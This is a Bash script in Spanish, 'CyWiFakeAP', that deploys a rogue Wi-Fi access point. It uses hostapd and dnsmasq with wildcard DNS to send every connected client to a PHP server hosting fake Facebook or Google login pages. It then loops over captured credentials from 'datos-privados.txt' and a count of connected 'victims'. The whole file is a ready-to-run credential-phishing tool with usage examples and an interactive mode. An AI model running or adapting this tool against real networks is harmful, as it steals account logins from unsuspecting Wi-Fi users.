#!/bin/bash

# CyWiFakeAP, Creado por CYBERIUS ©
# Herramienta para desplegar un Rogue Access Point con plantillas falsas para captura de credenciales

# Colores para la salida en consola
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[↪]${endColour}${grayColour} Saliendo y restaurando entorno...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find . -name datos-privados.txt | xargs rm 2>/dev/null
	ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null
	airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
	tput cnorm
	service network-manager restart
	exit 0
}

function banner(){
  if [[ -f banner.txt ]]; then
    while IFS= read -r line; do
      echo -e "${redColour}${line}${endColour}"
      sleep 0.05
    done < banner.txt
  else
    echo -e "${redColour}[!] No se encontró el archivo banner.txt${endColour}"
  fi
}

function dependencies(){
	echo -e "\n${yellowColour}[🧰]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1
	counter=0
	dependencias=(php dnsmasq hostapd)
	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e "${greenColour}[✔]${endColour}${grayColour} $programa está instalado."
			let counter+=1
		else
			echo -e "${redColour}[✘]${endColour}${grayColour} Falta $programa."
		fi; sleep 0.3
	done
	if [ $counter -ne 3 ]; then
		echo -e "\n${redColour}[!]${endColour}${grayColour} Faltan dependencias. Instala php, dnsmasq y hostapd.${endColour}\n"
		exit 1
	else
		echo -e "\n${yellowColour}[✔]${endColour}${grayColour} Todo listo.${endColour}\n"
		sleep 2
	fi
}

function getCredentials(){
	tput civis
	activeHosts=0
	while true; do
		echo -e "\n${yellowColour}[📡]${endColour}${grayColour} Esperando credenciales capturadas... (Ctrl+C para salir)${endColour}\n"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "${blueColour}[👥] Víctimas conectadas: $activeHosts${endColour}\n"
		find . -name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 3; clear
	done
}

function startAttack(){
	if [ -z "$interface" ] || [ -z "$ssid" ] || [ -z "$canal" ] || [ -z "$plantilla" ]; then
		echo -e "${redColour}[!]${endColour} Faltan argumentos. Usa -h para ver ejemplos."
		exit 1
	fi

	echo -e "\n${yellowColour}[🌐]${endColour} ${purpleColour}Usando interfaz $interface, canal $canal, SSID $ssid${endColour}"

	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5
	rm -f credenciales.txt dnsmasq.conf hostapd.conf 2>/dev/null

	echo -e "interface=$interface\ndriver=nl80211\nssid=$ssid\nhw_mode=g\nchannel=$canal\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0" > hostapd.conf

	echo -e "${yellowColour}[⚙️]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &

	sleep 6

	# 🛑 COMPROBACIÓN DE ERROR EN INTERFAZ
	if ! ip link show "$interface" > /dev/null 2>&1; then
		echo -e "\n${redColour}[🚨] ERROR: La interfaz '$interface' no está disponible.${endColour}"
		echo -e "${yellowColour}[💡]${endColour} ${grayColour}¿Olvidaste ponerla en modo monitor? Prueba con:${endColour} ${blueColour}sudo airmon-ng start wlan0${endColour}\n"
		echo -e "${redColour}[!] Abortando ejecución.${endColour}\n"
		exit 1
	fi

	echo -e "interface=$interface\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/192.168.1.1" > dnsmasq.conf

	ifconfig "$interface" up 192.168.1.1 netmask 255.255.255.0 2>/dev/null
	if [ $? -ne 0 ]; then
		echo -e "\n${redColour}[🚨] ERROR al configurar IP en $interface.${endColour}"
		echo -e "${yellowColour}[💡]${endColour} ${grayColour}Verifica que esté en modo monitor correctamente.${endColour}\n"
		exit 1
	fi

	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

	sleep 2
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 5

	if [ "$plantilla" == "Facebook" ] || [ "$plantilla" == "Google" ]; then
		echo -e "\n${yellowColour}[💻]${endColour}${grayColour} Montando servidor PHP con plantilla $plantilla...${endColour}"
		pushd $plantilla > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1
		getCredentials
	else
		echo -e "\n${redColour}[!] Plantilla no válida. Usa Facebook o Google.${endColour}"
		exit 1
	fi
}

function modoInteractivo(){
	interface=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
	ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso (Ej: wifiGratis):" 8 50 --title "CYBERIUS - SSID" 3>&1 1>&2 2>&3)
	canal=$(whiptail --title "CYBERIUS - Canal" --menu "Selecciona el canal" 15 50 6 \
		1 "Canal 1" \
		6 "Canal 6" \
		11 "Canal 11" 3>&1 1>&2 2>&3)
	plantilla=$(whiptail --title "CYBERIUS - Plantilla" --menu "Elige una plantilla" 15 50 2 \
		Facebook "Portal falso de Facebook" \
		Google "Portal falso de Google" 3>&1 1>&2 2>&3)
	startAttack
}

function helpPanel(){
	banner
	echo -e "\n${grayColour}Modo de uso:${endColour}"

	echo -e "\n${yellowColour}[!]${endColour}${grayColour} Existen 2 formas de usar el script:${endColour}"
		echo -e "\t${purpleColour}[!] Recuerda primero poner tu interfaz en modo monitor:${endColour} ${blueColour}sudo airmon-ng start wlan0${endColour}"
	
	echo -e "\n1. ${greenColour}Modo directo con parámetros:${endColour}"
	
	echo -e "\t${blueColour}Ejemplo:${endColour} ${greenColour}sudo bash CyWiFakeAP.sh -m iniciar -i wlan0mon -s wifiGratis -c 6 -t Google${endColour}"

	echo -e "\n2. ${greenColour}Modo interactivo (El cual te va haciendo preguntas):${endColour}"
	echo -e "\t${blueColour}Ejemplo:${endColour} ${greenColour}./CyWiFakeAP.sh -m interactivo${endColour}"

	echo -e "\n${grayColour}Parámetros disponibles:${endColour}"
	echo -e "\t${redColour}-m${endColour}${blueColour} Modo de ejecución${endColour} (${yellowColour}iniciar${endColour} o ${yellowColour}interactivo${endColour})"
	echo -e "\t${redColour}-i${endColour}${blueColour} Interfaz WiFi en modo monitor${endColour} (Ej: wlan0mon)"
	echo -e "\t${redColour}-s${endColour}${blueColour} Nombre del SSID a emitir${endColour} (Ej: wifiGratis)"
	echo -e "\t${redColour}-c${endColour}${blueColour} Canal de emisión${endColour} (Ej: 6)"
	echo -e "\t${redColour}-t${endColour}${blueColour} Plantilla a usar${endColour} (Facebook o Google)"
	echo -e "\t${redColour}-h${endColour}${blueColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}


if [ "$(id -u)" == "0" ]; then
	while getopts ":m:i:s:c:t:h" arg; do
		case $arg in
			m) mode=$OPTARG ;;
			i) interface=$OPTARG ;;
			s) ssid=$OPTARG ;;
			c) canal=$OPTARG ;;
			t) plantilla=$OPTARG ;;
			h) helpPanel ;;
			*) helpPanel ;;
		esac
	done

	case $mode in
		iniciar)
			banner
			dependencies
			startAttack
			;;
		interactivo)
			banner
			dependencies
			modoInteractivo
			;;
		*) helpPanel ;;
	esac
else
	echo -e "\n${redColour}[!]${endColour} Ejecuta como root."
	exit 1
fi
